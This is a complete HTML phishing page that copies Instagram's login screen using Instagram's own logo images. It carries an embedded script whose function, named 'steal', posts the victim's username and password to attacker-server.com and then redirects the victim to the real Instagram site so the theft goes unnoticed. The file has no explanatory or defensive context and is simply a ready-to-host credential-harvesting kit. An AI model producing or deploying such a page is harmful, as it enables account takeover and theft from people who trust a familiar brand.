<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 350px;
      margin: 80px auto;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .app-icon {
      width: 64px;
      margin-bottom: 15px;
    }

    .logo {
      width: 175px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }

    button {
      background-color: #0095f6;
      border: none;
      color: white;
      padding: 8px;
      margin-top: 10px;
      width: 100%;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .or-separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .or-separator::before,
    .or-separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 13px;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Instagram app icon -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
         alt="Instagram App Icon" 
         class="app-icon">

    <!-- Instagram text logo -->
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
         alt="Instagram" 
         class="logo">
    
    <form onsubmit="steal(event)">
      <input id="username" type="text" placeholder="Phone number, username, or email" required>
      <input id="password" type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or-separator"><span>OR</span></div>
    <div style="font-size: 14px; color: #385185; font-weight: 500;">Log in with Facebook</div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault();
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      fetch("https://attacker-server.com/steal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: u, password: p })
      }).then(() => {
        window.location.href = "https://instagram.com";
      });
    }
  </script>
</body>
</html>
